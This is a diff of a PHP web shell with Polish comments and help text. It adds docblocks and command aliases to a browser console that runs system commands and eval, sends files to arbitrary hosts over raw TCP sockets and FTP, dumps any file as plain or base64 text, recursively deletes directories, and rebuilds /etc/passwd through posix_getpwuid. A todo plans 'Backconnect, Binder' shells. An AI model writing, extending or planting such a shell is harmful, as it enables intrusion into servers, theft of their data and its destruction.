@@ -1,10 +1,33 @@
 <?php
 
+/**
+ * Part of Neapter Framework
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2011, Krzysztof Otręba
+ */
+
 require_once __DIR__ . '/Arr.php';
 require_once __DIR__ . '/Request.php';
 require_once __DIR__ . '/Form.php';
 require_once __DIR__ . '/Html.php';
 
+/**
+ * class Shell - Zarzadzanie serwerem ;)
+ *
+ * @version    0.1
+ *
+ * @todo
+ *      MysqlDumper - oparty na poleceniu systemowym mysqldump oraz bibliotece PHP MysqlDumper
+ *      Edycja pliku
+ *      Tworzenie katalogow
+ *      Backconnect, Binder
+ *      Inne przydatne dziwactwa, ktore sie przydadza
+ *
+ * @uses       Request
+ * @uses       Form
+ * @uses       Html
+ */
 class Shell
 {
 	/**
@@ -90,6 +113,9 @@ class Shell
 	/**
 	 * Konstruktor
 	 *
+	 * @uses   Request
+	 *
+	 * @access public
 	 * @return void
 	 */
 	public function __construct()
@@ -240,8 +266,17 @@ class Shell
 		);
 	}
 
+	/**
+	 * Komenda - echo
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandEcho()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -255,13 +290,22 @@ HELP;
 		return htmlspecialchars( $this -> sArg );
 	}
 
-
+	/**
+	 * Komenda - game
+	 *
+	 * @ignore
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandGame()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-game - Gra z komputerem
+game - Gra z komputerem, wspaniała na samotne wieczory ;)
 
 	Użycie:
 		echo cyfra_z_przedziału_0-9
@@ -270,17 +314,23 @@ game - Gra z komputerem
 HELP;
 		}
 
+		/**
+		 * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
+		 */
 		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
 		{
 			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
 		}
 
+		/**
+		 * Maksymalnie 1000 losowan
+		 */
 		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
 		{
 			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
 		}
 
-		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 1 );
+		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 5 );
 
 		$sOutput = NULL;
 
@@ -313,15 +363,17 @@ HELP;
 		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
 	}
 
-
 	/**
-	 * Eval
+	 * Komenda - eval
 	 *
 	 * @access private
-	 * @return type string
+	 * @return string
 	 */
 	private function getCommandEval()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -345,16 +397,20 @@ HELP;
 	}
 
 	/**
-	 * SocketUpload
+	 * Komenda - socketupload
 	 *
-	 * @return type st
+	 * @access private
+	 * @return string
 	 */
-	public function getCommandSocketUpload()
+	private function getCommandSocketUpload()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-socketupload, socketup - Wysyłanie pliku za pomocą protokołu TCP
+socketupload, socketup, socketput - Wysyłanie pliku za pomocą protokołu TCP
 
 	Użycie:
 		socketupload host:port ścieżka_do_pliku
@@ -369,21 +425,33 @@ HELP;
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
 
+		/**
+		 * Port jest wymagany
+		 */
 		if( $aHost[1] === 0 )
 		{
 			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
 		}
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		if( ! is_file( $this -> aArgv[1] ) )
 		{
 			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
 		}
 
-		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 1 ) ) === FALSE )
+		/**
+		 * Polaczenie z hostem
+		 */
+		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 5 ) ) === FALSE )
 		{
 			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
 		}
 
+		/**
+		 * File
+		 */
 		if( ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) === FALSE )
 		{
 			return sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] );
@@ -393,20 +461,28 @@ HELP;
 		{
 			fwrite( $rSock, fread( $rFile, 131072 ) );
 		}
+
 		fclose( $rFile );
 		fclose( $rSock );
 
 		return 'Plik został przesłany';
 	}
 
-
-
-	public function getCommandSocketDownload()
+	/**
+	 * Komenda - socketdownload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandSocketDownload()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-socketdownload, socketdown - Pobieranie pliku za pomocą protokołu TCP
+socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP
 
 	Użycie:
 		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany
@@ -419,6 +495,9 @@ socketdownload, socketdown - Pobieranie pliku za pomocą protokołu TCP
 HELP;
 		}
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		$aHost = $this -> getHost( $this -> aArgv[0] );
 
 		if( $aHost[1] === 0 )
@@ -426,11 +505,17 @@ HELP;
 			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
 		}
 
+		/**
+		 * Polaczenie z hostem
+		 */
 		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 1 ) ) === FALSE )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
 		}
 
+		/**
+		 * File
+		 */
 		if( ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) === FALSE )
 		{
 			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
@@ -441,21 +526,27 @@ HELP;
 			fwrite( $rFile, fread( $rSock, 131072 ) );
 		}
 
-		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
-
 		fclose( $rFile );
 		fclose( $rSock );
+
+		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
 	}
 
-
-
-
-	public function getCommandFtpUpload()
+	/**
+	 * Komenda - ftpupload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandFtpUpload()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-ftpupload, ftpup - Wysyłanie pliku na FTP
+ftpupload, ftpup, ftpput - Wysyłanie pliku na FTP
 
 	Użycie:
 		ftpupload host:port login@hasło plik_źródłowy ścieżka_docelowa
@@ -465,6 +556,9 @@ ftpupload, ftpup - Wysyłanie pliku na FTP
 HELP;
 		}
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		if( ! is_file( $this -> aArgv[2] ) )
 		{
 			return htmlspecialchars( sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[2] ) );
@@ -477,9 +571,14 @@ HELP;
 			$aHost[1] = 21;
 		}
 
+		/**
+		 * login@pass
+		 */
 		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );
 
-
+		/**
+		 * Ustanawianie polaczenia
+		 */
 		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
@@ -493,11 +592,17 @@ HELP;
 			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
 		}
 
+		/**
+		 * Zmiana katalogu
+		 */
 		if( ! ftp_chdir( $rFtp, $this -> aArgv[3] ) )
 		{
 			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $this -> aArgv[2] ) );
 		}
 
+		/**
+		 * Wrzucanie pliku
+		 */
 		if( ! ftp_put( $rFtp, basename( $this -> aArgv[2] ), $this -> aArgv[2], FTP_BINARY ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można wgrać pliku "%s" na serwer', $this -> aArgv[2] ) );
@@ -508,12 +613,21 @@ HELP;
 		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie wgrany an FTP', $this -> aArgv[2] ) );
 	}
 
-	public function getCommandFtpDownload()
+	/**
+	 * Komenda - ftpdownload
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandFtpDownload()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-ftpdownload, ftpdown - Pobieranie pliku z FTP
+ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP
 
 	Użycie:
 		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_
@@ -530,9 +644,14 @@ HELP;
 			$aHost[1] = 21;
 		}
 
+		/**
+		 * login@pass
+		 */
 		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );
 
-
+		/**
+		 * Ustanawianie polaczenia
+		 */
 		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
@@ -546,11 +665,17 @@ HELP;
 			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
 		}
 
+		/**
+		 * Zmiana katalogu
+		 */
 		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
 		{
 			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
 		}
 
+		/**
+		 * Pobieranie pliku
+		 */
 		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
@@ -561,12 +686,17 @@ HELP;
 		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
 	}
 
-
-
-
-
+	/**
+	 * Komenda - ls
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandLs()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -588,23 +718,36 @@ ls - Wyświetlanie informacji o plikach i katalogach
 HELP;
 		}
 
+		$sOutput = NULL;
+
+		/**
+		 * Lista opcji
+		 */
 		$aOptions = array();
+
+		/**
+		 * Sprawdzanie czy wystepuja opcje
+		 */
 		if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
 		{
 			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
 			array_shift( $this -> aArgv );
 		}
 
+		/**
+		 * Domyslny katalog jezeli nie podano sciezki
+		 */
 		$sDir = ( ! empty( $this -> aArgv[0] ) ? $this -> aArgv[0] : dirname( __FILE__ ) );
-
-		$sOutput = NULL;
-
 
 		$bList      = in_array( 'l', $aOptions );
 		$bRecursive = in_array( 'R', $aOptions );
 
 		try
 		{
+			/**
+			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
+			 * obiektu RecursiveDirectoryIterator
+			 */
 			if( $bRecursive )
 			{
 				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
@@ -614,6 +757,9 @@ HELP;
 				$oDirectory = new DirectoryIterator( $sDir );
 			}
 
+			/**
+			 * Informacja o komendzie jaka wykonalismy
+			 */
 			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArg );
 
 			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );
@@ -622,6 +768,9 @@ HELP;
 			{
 				if( $bList )
 				{
+					/**
+					 * Windows ?
+					 */
 					if( $this -> bWindows )
 					{
 						$sOutput .= sprintf( "%s %11d %s %s\n", ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ), $oFile -> getSize(), date( 'Y-m-d h:i', $oFile -> getCTime() ), $oFile -> {$sFileName}() );
@@ -637,7 +786,6 @@ HELP;
 				}
 			}
 
-
 			return htmlspecialchars( $sOutput );
 		}
 		catch( Exception $oException )
@@ -646,9 +794,17 @@ HELP;
 		}
 	}
 
-
+	/**
+	 * Komenda - remove
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandRemove()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -661,6 +817,9 @@ HELP;
 
 		$sOutput = NULL;
 
+		/**
+		 * Jezeli podana sciezka to plik
+		 */
 		if( is_file( $this -> aArgv[0] ) )
 		{
 			if( ! unlink( $this -> aArgv[0] ) )
@@ -670,7 +829,9 @@ HELP;
 
 			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
 		}
-
+		/**
+		 * Jezeli podana sciezka to katalog
+		 */
 		if( is_dir( $this -> aArgv[0] ) )
 		{
 			try
@@ -681,6 +842,9 @@ HELP;
 				{
 					if( $oFile -> isDir() )
 					{
+						/**
+						 * Usuwanie katalogu
+						 */
 						if( ! rmdir( $oFile -> getPathname() ) )
 						{
 							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
@@ -688,6 +852,9 @@ HELP;
 					}
 					else
 					{
+						/**
+						 * Usuwanie pliku
+						 */
 						if( ! unlink( $oFile -> getPathname() ) )
 						{
 							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
@@ -695,6 +862,9 @@ HELP;
 					}
 				}
 
+				/**
+				 * Usuwanie ostatniego katalogu
+				 */
 				if( ! rmdir( $this -> aArgv[0] ) )
 				{
 					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> aArgv[0] );
@@ -705,18 +875,23 @@ HELP;
 				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
 			}
 
-
 			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
 		}
 
 		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> aArgv[0] );
 	}
 
-
-
-
+	/**
+	 * Komenda - bcat
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandBCat()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -730,19 +905,35 @@ bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
 HELP;
 		}
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		if( ! is_file( $this -> aArgv[0] ) )
 		{
 			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
 		}
 
+		/**
+		 * Naglowek Mime i zrodlo pliku w base64
+		 */
 		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
 			basename( $this -> aArgv[0] ), basename( $this -> aArgv[0] )
 		);
+
 		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> aArgv[0] ) ), 130 ) );
 	}
 
+	/**
+	 * Komenda - cat
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandCat()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -756,6 +947,9 @@ cat - Wyświetlanie zawartości pliku
 HELP;
 		}
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		if( ! is_file( $this -> aArgv[0] ) )
 		{
 			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
@@ -764,13 +958,21 @@ HELP;
 		return htmlspecialchars( file_get_contents( $this -> aArgv[0] ) );
 	}
 
-
+	/**
+	 * Komenda - download
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandDownload()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-download, down - Pobieranie pliku
+download, down, get - Pobieranie pliku
 
 	Użycie:
 		download ścieżka_do_pliku
@@ -785,6 +987,10 @@ HELP;
 		}
 
 		$aOptions = array();
+
+		/**
+		 * Sprawdzanie czy wystepuja opcje
+		 */
 		if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
 		{
 			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
@@ -793,11 +999,17 @@ HELP;
 
 		$bGzip = in_array( 'g', $aOptions );
 
+		/**
+		 * Plik zrodlowy musi istniec
+		 */
 		if( ! is_file( $this -> aArgv[0] ) )
 		{
 			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
 		}
 
+		/**
+		 * Kompresja zawartosci strony
+		 */
 		if( $bGzip )
 		{
 			ini_set( 'zlib.output_compression', 9 );
@@ -805,6 +1017,9 @@ HELP;
 
 		ob_start();
 
+		/**
+		 * Naglowki
+		 */
 		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
 		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> aArgv[0] ) ), TRUE );
 		header( 'Content-Type: application/octet-stream', TRUE );
@@ -823,58 +1038,24 @@ HELP;
 				flush();
 			}
 		}
+
 		ob_end_flush();
 		exit ;
 	}
 
-
-	public function getCommandHelp()
-	{
-		$this -> aArgv[0] = 'help';
-		$this -> iArgc    = 1;
-
-		$oClass = new ReflectionClass( 'Shell' );
-		$aMethods = $oClass -> getMethods();
-
-		$aCommandsInfo = array();
-
-		$sOutput = NULL;
-
-		foreach( $aMethods as $oClass )
-		{
-			$sClass = $oClass -> getName();
-			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) )
-			{
-				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
-				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
-				$sOutput .= $sInfo;
-
-			}
-		}
-
-		$iDashPos = 0;
-		$aCommands = array();
-		foreach( $aCommandsInfo as $sCommand )
-		{
-			if( $iDashPos < ( $iDashNewPos = strpos( $sCommand, '-' ) ) )
-			{
-				$iDashPos = $iDashNewPos;
-			}
-			$aCommands[] = strlen( trim( substr( $sCommand, 0, $iDashNewPos - 1 ) ) );
-		}
-
-		foreach( $aCommandsInfo as $iKey => & $sCommand )
-		{
-			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommands[ $iKey ] ), $aCommands[ $iKey ], 0 );
-		}
-
-
-		return implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput;
-	}
-
-
+	/**
+	 * Komenda - phpinfo
+	 *
+	 * @uses   Html
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandPhpInfo()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -914,15 +1095,20 @@ HELP;
 		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
 		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );
 
-
 		return Html::shrink( $sData );
 	}
 
-
-
-
+	/**
+	 * Komenda - etcpasswd
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandEtcPasswd()
 	{
+		/**
+		 * Help
+		 */
 		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
@@ -940,49 +1126,148 @@ etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix
 HELP;
 		}
 
+		/**
+		 * Nie mozemy uruchomic tego na windowsie
+		 */
 		if( $this -> bWindows )
 		{
 			return 'Nie można uruchomić tego na windowsie';
 		}
 
+		/**
+		 * funkcja posix_getpwuid musi istniec
+		 */
 		if( $this -> bFuncOwnerById )
 		{
 			return 'Funkcja "posix_getpwuid" nie istnieje';
 		}
 
+		/**
+		 * Dolny zakres
+		 */
 		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
 		{
 			return 'Błędny zakres dolny';
 		}
 
+		/**
+		 * Gorny zakres
+		 */
 		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
 		{
 			return 'Błędny zakres górny';
 		}
 
+		$sOutput = NULL;
+
 		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
 		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );
 
-		$sOutput = NULL;
+		/**
+		 * Iteracja
+		 */
 		for( $i = $iMin; $i <= $iMax; $i++ )
 		{
 			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
 			{
+				/**
+				 * Wzor jak dla pliku /etc/passwd
+				 */
 				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
 			}
 		}
+
 		return $sOutput;
 	}
 
-
-
-	public function getActionBrowser()
+	/**
+	 * Komenda - help
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandHelp()
 	{
+		$this -> aArgv[0] = 'help';
+		$this -> iArgc    = 1;
+
+		$oClass = new ReflectionClass( 'Shell' );
+		$aMethods = $oClass -> getMethods();
+
+		/**
+		 * Naglowek komendy
+		 */
+		$aCommandsInfo = array();
+
+		$sOutput = NULL;
+
+		/**
+		 * Wyszukiwanie metod zaczynających się od getCommand
+		 */
+		foreach( $aMethods as $oClass )
+		{
+			$sClass = $oClass -> getName();
+			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) )
+			{
+				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
+				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
+				$sOutput .= $sInfo;
+
+			}
+		}
+
+		$iDashPos = 0;
+
+		/**
+		 * Pozycja znaku '-'
+		 */
+		$aCommandsPos = array();
+
+		/**
+		 * Wyrownanie znaku '-' tak by znajdowaly sie pod soba
+		 */
+		foreach( $aCommandsInfo as $sCommand )
+		{
+			if( $iDashPos < ( $iDashNewPos = strpos( $sCommand, '-' ) ) )
+			{
+				$iDashPos = $iDashNewPos;
+			}
+			$aCommandsPos[] = strlen( trim( substr( $sCommand, 0, $iDashNewPos - 1 ) ) );
+		}
+		--$iDashPos;
+
+		foreach( $aCommandsInfo as $iKey => & $sCommand )
+		{
+			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommandsPos[ $iKey ] ), $aCommandsPos[ $iKey ], 0 );
+		}
+
+		return implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput;
+	}
+
+	/**
+	 * Domyslna akcja, dostep do konsoli
+	 *
+	 * @uses   Request
+	 * @uses   Form
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getActionBrowser()
+	{
+		/**
+		 * Zawartosc konsoli
+		 */
 		$sConsole = NULL;
+
+		/**
+		 * Komenda
+		 */
 		$sCmd = NULL;
 
-		$sContent = NULL;
-
+		/**
+		 * Domyslna komenda to :ls -lR sciezka_do_katalogu
+		 */
 		if( ! Request::isPost() )
 		{
 			$sCmd = ':ls -lR ' . dirname( __FILE__ );
@@ -992,6 +1277,9 @@ HELP;
 			$sCmd = (string) Request::getPost( 'cmd' );
 		}
 
+		/**
+		 * Komendy shella rozpoczynaja sie od znaku ':'
+		 */
 		if( substr( $sCmd, 0, 1 ) === ':' )
 		{
 			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
@@ -1007,6 +1295,8 @@ HELP;
 
 			/**
 			 * Rozdzielanie argumentow
+			 *
+			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
 			 */
 			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArg, $aMatch ) );
 			{
@@ -1033,8 +1323,12 @@ HELP;
 				);
 				$this -> aArgv = $aMatch[0];
 			}
+
 			$this -> iArgc = count( $this -> aArgv );
 
+			/**
+			 *  Lista komend i aliasy
+			 */
 			switch( $this -> sCmd )
 			{
 				case 'echo':
@@ -1048,18 +1342,22 @@ HELP;
 					break;
 				case 'socketupload':
 				case 'socketup':
+				case 'socketput':
 					$sConsole = $this -> getCommandSocketUpload();
 					break ;
 				case 'socketdownload':
 				case 'socketdown':
+				case 'socketget':
 					$sConsole = $this -> getCommandSocketDownload();
 					break ;
 				case 'ftpupload':
 				case 'ftpup':
+				case 'ftpput':
 					$sConsole = $this -> getCommandFtpUpload();
 					break ;
 				case 'ftpdownload':
 				case 'ftpdown':
+				case 'ftpget':
 					$sConsole = $this -> getCommandFtpDownload();
 					break ;
 				case 'ls':
@@ -1074,6 +1372,7 @@ HELP;
 					break;
 				case 'download':
 				case 'down':
+				case 'get':
 					$sConsole = $this -> getCommandDownload();
 					break;
 				case 'game':
@@ -1095,6 +1394,9 @@ HELP;
 					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
 			}
 		}
+		/**
+		 * Wykonanie komendy systemowej
+		 */
 		else if( ! $this -> bSafeMode )
 		{
 			ob_start();
@@ -1137,18 +1439,23 @@ HELP;
 			$sConsole = 'Safe mode jest włączone, więc exec, shell_exec, passthru, system i fopen nie zadziałają';
 		}
 
-
-		$sContent .= sprintf( '<pre id="console">%s</pre><br />', $sConsole );
+		$sContent  = sprintf( '<pre id="console">%s</pre><br />', $sConsole );
 		$sContent .= Form::open();
 		$sContent .= Form::inputText( 'cmd', $sCmd, TRUE, array( 'size' => 110, 'id' => 'cmd' ) );
 		$sContent .= Form::inputSubmit( 'submit', 'Send', array( 'id' => 'cmd-send' ) );
 		$sContent .= Form::close();
 
 		return $this -> getContent( $sContent );
-
 	}
 
-
+	/**
+	 * Pobieranie calosci strony
+	 *
+	 * @uses   Request
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getContent( $sData )
 	{
 		$sMenu = $this -> getMenu();
@@ -1169,13 +1476,10 @@ table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-bor
 td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0px;padding:0px;padding-left:4px}
 th{color:#054463;font-size:14px;font-weight:bold;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px}
 hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
-
 div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:950px;background-color:#fff;margin:0 auto;padding:20px;}
 div#menu{margin:0 auto;text-align:left;}
 div#bottom{margin:0 auto}
 div#content{margin:0 auto;padding-top:10px}
-
-
 pre#console{text-align:left;margin: 0 auto;height:400px;min-height:400px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;padding:8px;overflow:scroll}
 input#cmd{width:95%;font-size:14px;margin-top:10px; padding: 4px;}
 .green{color:#55b855;font-weight:bold}
@@ -1200,6 +1504,12 @@ input#cmd{width:95%;font-size:14px;margin-top:10px; padding: 4px;}
 CONTENT;
 	}
 
+	/**
+	 * Wyswietlanie strony
+	 *
+	 * @access private
+	 * @return string
+	 */
 	public function get()
 	{
 		$sData = $this -> getActionBrowser();
@@ -1208,9 +1518,6 @@ CONTENT;
 
 	}
 }
-
-
-
 
 /**
  * Wylaczanie wszystkich bufferow
